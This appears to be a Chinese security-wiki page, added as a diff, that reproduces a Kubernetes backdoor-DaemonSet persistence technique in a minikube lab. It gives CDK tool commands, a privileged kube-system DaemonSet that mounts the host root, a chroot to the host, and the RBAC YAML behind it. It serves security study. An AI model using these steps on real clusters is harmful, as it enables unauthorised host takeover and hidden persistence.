@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20Daemonset/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Kubernetes 部署后门 Daemonset - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Kubernetes \u90e8\u7f72\u540e\u95e8 Daemonset", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+              {title: "\u73af\u5883\u590d\u539f", url: "#_4" },
+              {title: "YAML", url: "#yaml" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/" class="btn btn-xs btn-link">
+        Linux 内核 cgroup v1 逻辑错误导致容器逃逸 CVE-2022-0492
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20CronJob/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20CronJob/" class="btn btn-xs btn-link">
+        Kubernetes 部署后门 CronJob
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="kubernetes-daemonset">Kubernetes 部署后门 Daemonset<a class="headerlink" href="#kubernetes-daemonset" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>DaemonSet 确保全部（或者某些）节点上运行一个 Pod 的副本。 当有节点加入集群时， 也会为他们新增一个 Pod 。 当有节点从集群移除时，这些 Pod 也会被回收。删除 DaemonSet 将会删除它创建的所有 Pod。</p>
+<p>在集群内获取到一定的权限，需要对当前的权限进行持久化控制时，可利用 K8s Daemonset 资源的特性，创建一个 kube-system 命名空间下的 Daemonset 资源，进行持久化控制。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/daemonset/">https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/daemonset/</a></li>
+<li><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset">https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset</a></li>
+<li><a href="https://github.com/cdk-team/CDK/blob/main/test/k8s_exploit_util/backdoor_daemonset.yaml">https://github.com/cdk-team/CDK/blob/main/test/k8s_exploit_util/backdoor_daemonset.yaml</a></li>
+<li><a href="https://github.com/Metarget/metarget">https://github.com/Metarget/metarget</a></li>
+</ul>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>基础环境准备（Docker + Minikube + Kubernetes），可参考 <a href="https://github.com/Threekiii/Awesome-POC/blob/master/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">Kubernetes + Ubuntu 18.04 漏洞环境搭建</a> 完成。</p>
+<p>本例中各组件版本如下：</p>
+<div class="highlight"><pre><span></span><code>Docker version: 18.09.3
+minikube version: v1.35.0
+Kubectl Client Version: v1.32.3
+Kubectl Server Version: v1.32.0
+</code></pre></div>
+<p>通过 yaml 文件创建漏洞环境：</p>
+<div class="highlight"><pre><span></span><code>kubectl apply -f k8s_metarget_namespace.yaml
+kubectl apply -f k8s_backdoor_daemonset.yaml
+</code></pre></div>
+<p>执行完成后，K8s 集群内 <code>metarget</code> 命名空间下将会创建一个名为 <code>k8s-backdoor-daemonset</code> 的 pod：</p>
+<div class="highlight"><pre><span></span><code>kubectl get pods -n metarget
+-----
+NAME                     READY   STATUS    RESTARTS   AGE
+k8s-backdoor-daemonset   1/1     Running   0          9m54s
+</code></pre></div>
+<p><img alt="" src="../images/Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20Daemonset/image-20250422100649103.png" /></p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>下载漏洞利用工具 <a href="https://github.com/cdk-team/CDK">CDK</a>，将其传入 <code>k8s-backdoor-daemonset</code>pod 中：</p>
+<div class="highlight"><pre><span></span><code>kubectl cp cdk k8s-backdoor-daemonset:/ -n metarget
+</code></pre></div>
+<p>执行以下命令运行工具（该命令会在 <code>kubs-system</code> 空间下创建一个 daemonset 资源）：</p>
+<div class="highlight"><pre><span></span><code>kubectl exec -n metarget -it k8s-backdoor-daemonset -- chmod +x /cdk
+kubectl exec -n metarget -it k8s-backdoor-daemonset -- /cdk run k8s-backdoor-daemonset default ubuntu &quot;touch /tmp/awesome_poc ; sleep 10000&quot;
+-----
+2025/04/22 02:11:42 getting K8s api-server API addr.
+    Find K8s api-server in ENV: https://10.96.0.1:443
+2025/04/22 02:11:42 trying to deploy daemonset with image:ubuntu to k8s-app:kube-proxy
+2025/04/22 02:11:42 api-server response:
+{&quot;kind&quot;:&quot;DaemonSet&quot;,&quot;apiVersion&quot;:&quot;apps/v1&quot;,&quot;metadata&quot;:{&quot;name&quot;:&quot;cdk-backdoor-daemonset&quot;,&quot;namespace&quot;:&quot;kube-system&quot;,&quot;uid&quot;:&quot;ffdf2f2e-e4ce-4938-8ed9-ee7b80753381&quot;,&quot;resourceVersion&quot;:&quot;4619&quot;,&quot;generation&quot;:1,&quot;creationTimestamp&quot;:&quot;2025-04-22T02:11:42Z&quot;,&quot;labels&quot;:{&quot;k8s-app&quot;:&quot;kube-proxy&quot;},&quot;annotations&quot;:{&quot;deprecated.daemonset.template.generation&quot;:&quot;1&quot;},&quot;managedFields&quot;:[{&quot;manager&quot;:&quot;Go-http-client&quot;,&quot;operation&quot;:&quot;Update&quot;,&quot;apiVersion&quot;:&quot;apps/v1&quot;,&quot;time&quot;:&quot;2025-04-22T02:11:42Z&quot;,&quot;fieldsType&quot;:&quot;FieldsV1&quot;,&quot;fieldsV1&quot;:{&quot;f:metadata&quot;:{&quot;f:annotations&quot;:{&quot;.&quot;:{},&quot;f:deprecated.daemonset.template.generation&quot;:{}},&quot;f:labels&quot;:{&quot;.&quot;:{},&quot;f:k8s-app&quot;:{}}},&quot;f:spec&quot;:{&quot;f:revisionHistoryLimit&quot;:{},&quot;f:selector&quot;:{},&quot;f:template&quot;:{&quot;f:metadata&quot;:{&quot;f:labels&quot;:{&quot;.&quot;:{},&quot;f:k8s-app&quot;:{}}},&quot;f:spec&quot;:{&quot;f:containers&quot;:{&quot;k:{\&quot;name\&quot;:\&quot;cdk-backdoor-pod\&quot;}&quot;:{&quot;.&quot;:{},&quot;f:args&quot;:{},&quot;f:image&quot;:{},&quot;f:imagePullPolicy&quot;:{},&quot;f:name&quot;:{},&quot;f:resources&quot;:{},&quot;f:securityContext&quot;:{&quot;.&quot;:{},&quot;f:capabilities&quot;:{&quot;.&quot;:{},&quot;f:add&quot;:{}},&quot;f:privileged&quot;:{}},&quot;f:terminationMessagePath&quot;:{},&quot;f:terminationMessagePolicy&quot;:{},&quot;f:volumeMounts&quot;:{&quot;.&quot;:{},&quot;k:{\&quot;mountPath\&quot;:\&quot;/host-root\&quot;}&quot;:{&quot;.&quot;:{},&quot;f:mountPath&quot;:{},&quot;f:name&quot;:{}}}}},&quot;f:dnsPolicy&quot;:{},&quot;f:hostNetwork&quot;:{},&quot;f:hostPID&quot;:{},&quot;f:restartPolicy&quot;:{},&quot;f:schedulerName&quot;:{},&quot;f:securityContext&quot;:{},&quot;f:terminationGracePeriodSeconds&quot;:{},&quot;f:volumes&quot;:{&quot;.&quot;:{},&quot;k:{\&quot;name\&quot;:\&quot;host-volume\&quot;}&quot;:{&quot;.&quot;:{},&quot;f:hostPath&quot;:{&quot;.&quot;:{},&quot;f:path&quot;:{},&quot;f:type&quot;:{}},&quot;f:name&quot;:{}}}}},&quot;f:updateStrategy&quot;:{&quot;f:rollingUpdate&quot;:{&quot;.&quot;:{},&quot;f:maxSurge&quot;:{},&quot;f:maxUnavailable&quot;:{}},&quot;f:type&quot;:{}}}}}]},&quot;spec&quot;:{&quot;selector&quot;:{&quot;matchLabels&quot;:{&quot;k8s-app&quot;:&quot;kube-proxy&quot;}},&quot;template&quot;:{&quot;metadata&quot;:{&quot;creationTimestamp&quot;:null,&quot;labels&quot;:{&quot;k8s-app&quot;:&quot;kube-proxy&quot;}},&quot;spec&quot;:{&quot;volumes&quot;:[{&quot;name&quot;:&quot;host-volume&quot;,&quot;hostPath&quot;:{&quot;path&quot;:&quot;/&quot;,&quot;type&quot;:&quot;&quot;}}],&quot;containers&quot;:[{&quot;name&quot;:&quot;cdk-backdoor-pod&quot;,&quot;image&quot;:&quot;ubuntu&quot;,&quot;args&quot;:[&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;touch /tmp/awesome_poc ; sleep 10000&quot;],&quot;resources&quot;:{},&quot;volumeMounts&quot;:[{&quot;name&quot;:&quot;host-volume&quot;,&quot;mountPath&quot;:&quot;/host-root&quot;}],&quot;terminationMessagePath&quot;:&quot;/dev/termination-log&quot;,&quot;terminationMessagePolicy&quot;:&quot;File&quot;,&quot;imagePullPolicy&quot;:&quot;IfNotPresent&quot;,&quot;securityContext&quot;:{&quot;capabilities&quot;:{&quot;add&quot;:[&quot;NET_ADMIN&quot;,&quot;SYS_ADMIN&quot;,&quot;SYS_PTRACE&quot;,&quot;AUDIT_CONTROL&quot;,&quot;MKNOD&quot;,&quot;SETFCAP&quot;]},&quot;privileged&quot;:true}}],&quot;restartPolicy&quot;:&quot;Always&quot;,&quot;terminationGracePeriodSeconds&quot;:30,&quot;dnsPolicy&quot;:&quot;ClusterFirst&quot;,&quot;hostNetwork&quot;:true,&quot;hostPID&quot;:true,&quot;securityContext&quot;:{},&quot;schedulerName&quot;:&quot;default-scheduler&quot;}},&quot;updateStrategy&quot;:{&quot;type&quot;:&quot;RollingUpdate&quot;,&quot;rollingUpdate&quot;:{&quot;maxUnavailable&quot;:1,&quot;maxSurge&quot;:0}},&quot;revisionHistoryLimit&quot;:10},&quot;status&quot;:{&quot;currentNumberScheduled&quot;:0,&quot;numberMisscheduled&quot;:0,&quot;desiredNumberScheduled&quot;:0,&quot;numberReady&quot;:0}}
+</code></pre></div>
+<p><img alt="" src="../images/Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20Daemonset/image-20250422101155770.png" /></p>
+<p>验证部署结果：</p>
+<div class="highlight"><pre><span></span><code>kubectl get ds -n kube-system | grep cdk
+-----
+cdk-backdoor-daemonset   1         1         1       1            1           &lt;none&gt;                   74s
+</code></pre></div>
+<p><img alt="" src="../images/Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20Daemonset/image-20250422101313343.png" /></p>
+<p>CDK 将宿主机根目录挂载到了 <a href="https://github.com/cdk-team/CDK/blob/main/test/k8s_exploit_util/backdoor_daemonset.yaml">/host-root</a>，此时我们已经获取了宿主机权限：</p>
+<div class="highlight"><pre><span></span><code>kubectl get pods -n kube-system | grep cdk
+-----
+cdk-backdoor-daemonset-rvmp9       1/1     Running   0             7m12s
+</code></pre></div>
+<p><img alt="" src="Public/Awesome-POC/云安全漏洞/images/Kubernetes%20部署后门%20Daemonset/image-20250519180051414.png" /></p>
+<div class="highlight"><pre><span></span><code>kubectl exec -n kube-system -it cdk-backdoor-daemonset-rvmp9 -- /bin/bash
+root@minikube:/# ls -al /tmp
+total 8
+drwxrwxrwt 1 root root 4096 May 19 09:49 .
+drwxr-xr-x 1 root root 4096 May 19 09:49 ..
+-rw-r--r-- 1 root root    0 May 19 09:49 awesome_poc
+root@minikube:/# chroot /host-root
+# cat /etc/hostname
+minikube
+</code></pre></div>
+<p><img alt="" src="Public/Awesome-POC/云安全漏洞/images/Kubernetes%20部署后门%20Daemonset/image-20250519180036573.png" /></p>
+<blockquote>
+<p>由于我们是在 minikube 上运行 kubernetes，这里逃逸到的是 minikube 虚拟机。</p>
+</blockquote>
+<h2 id="_4">环境复原<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>kubectl delete daemonset cdk-backdoor-daemonset -n kube-system
+kubectl delete -f k8s_backdoor_daemonset.yaml
+kubectl delete -f k8s_metarget_namespace.yaml
+</code></pre></div>
+<h2 id="yaml">YAML<a class="headerlink" href="#yaml" title="Permanent link">&para;</a></h2>
+<p><a href="https://github.com/Metarget/metarget/blob/master/yamls/k8s_metarget_namespace.yaml">k8s_metarget_namespace.yaml</a></p>
+<div class="highlight"><pre><span></span><code>apiVersion: v1
+kind: Namespace
+metadata:
+  name: metarget
+</code></pre></div>
+<p><a href="https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/k8s_backdoor_daemonset.yaml">k8s_backdoor_daemonset.yaml</a></p>
+<div class="highlight"><pre><span></span><code>apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: k8s-backdoor-daemonset
+  namespace: metarget
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: k8s-backdoor-daemonset
+rules:
+- apiGroups:
+  - apps
+  resources:
+  - daemonsets
+  verbs:
+  - create
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: k8s-backdoor-daemonset
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: k8s-backdoor-daemonset
+subjects:
+- kind: ServiceAccount
+  name: k8s-backdoor-daemonset
+  namespace: metarget
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: k8s-backdoor-daemonset
+  namespace: metarget
+spec:
+  serviceAccountName: k8s-backdoor-daemonset
+  containers:
+  - name: ubuntu
+    image: ubuntu:latest
+    imagePullPolicy: IfNotPresent
+    # Just spin &amp; wait forever
+    command: [ &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;--&quot; ]
+    args: [ &quot;while true; do sleep 30; done;&quot; ]
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/" class="btn btn-xs btn-link">
+        Linux 内核 cgroup v1 逻辑错误导致容器逃逸 CVE-2022-0492
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20CronJob/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20CronJob/" class="btn btn-xs btn-link">
+        Kubernetes 部署后门 CronJob
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
